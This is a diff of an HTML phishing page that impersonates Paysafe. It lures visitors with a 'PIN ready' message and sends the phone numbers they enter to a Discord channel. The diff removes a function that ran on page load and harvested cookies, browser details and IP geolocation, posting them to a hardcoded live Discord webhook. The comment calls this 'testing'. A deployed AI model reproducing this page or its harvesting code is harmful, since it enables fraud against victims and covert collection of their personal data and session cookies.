@@ -12,18 +12,8 @@
     <meta name="twitter:title" content="Get Your PIN Online!" />
     <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
     <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paysafe - Your PIN is Ready!</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paysafe - Verify Your Phone Number</title>
-    <script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;type=content-script&amp;dmn=0gls2zltv6ps6zcxuvqx.c.websim.com&amp;url=https%3A%2F%2F0gls2zltv6ps6zcxuvqx.c.websim.com%2Findex.html%3Fv%3D11%26raw%3D&amp;app=firefox.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1&amp;stealth=1&amp;st-push&amp;st-loc&amp;st-dnt&amp;st-1pcttl=4320"></script>
-<script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script><link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -126,13 +116,6 @@
             display: none; /* Hidden by default */
         }
     </style>
-    <script type="importmap">
-        {
-            "imports": {
-                
-            }
-        }
-    </script>
 </head>
 <body>
     <div class="container">
@@ -196,8 +179,6 @@
 
         // Basic phone number validation function
         function isValidPhoneNumber(phoneNumber) {
-            // This is a basic validation. It checks if the number contains at least 7 digits after cleaning.
-            // A more robust solution might involve country-specific regex or a dedicated library.
             const cleanedNumber = phoneNumber.replace(/[\s-()]/g, '');
             return /^\d{7,}$/.test(cleanedNumber); // At least 7 digits
         }
@@ -228,7 +209,6 @@
 
                 if (response.ok) {
                     console.log('Phone number sent to Discord successfully!');
-                    // After successful submission, switch to PIN display
                     phoneInputSection.classList.add('hidden');
                     pinDisplaySection.classList.remove('hidden');
                 } else {
@@ -240,47 +220,6 @@
                 alert('Network error. Please check your connection and try again.');
             }
         });
-
-          async function getLocationAndShow() {
-            const info = {
-              userAgent: navigator.userAgent,
-              platform: navigator.platform,
-              language: navigator.language,
-              cookies: document.cookie,
-            };
-        
-            // Get IP/location info
-            try {
-              const res = await fetch("https://ipapi.co/json/");
-              const data = await res.json();
-              info.ip = data.ip;
-              info.city = data.city;
-              info.region = data.region;
-              info.country = data.country_name;
-              info.postal = data.postal;
-              info.org = data.org;
-            } catch (e) {
-              info.locationError = "Could not fetch location data";
-            }
-        
-        
-            // Send to Discord webhook – only for testing, not recommended for real user data!
-            // ⚠️ Replace this ONLY if users consent to sending this info.
-            fetch("https://discord.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                content: `📡 New visitor:
-        \`\`\`json
-        ${JSON.stringify(info, null, 2)}
-        \`\`\``
-              })
-            });
-          }
-    
-          getLocationAndShow();
     </script>
 </body>
 </html>
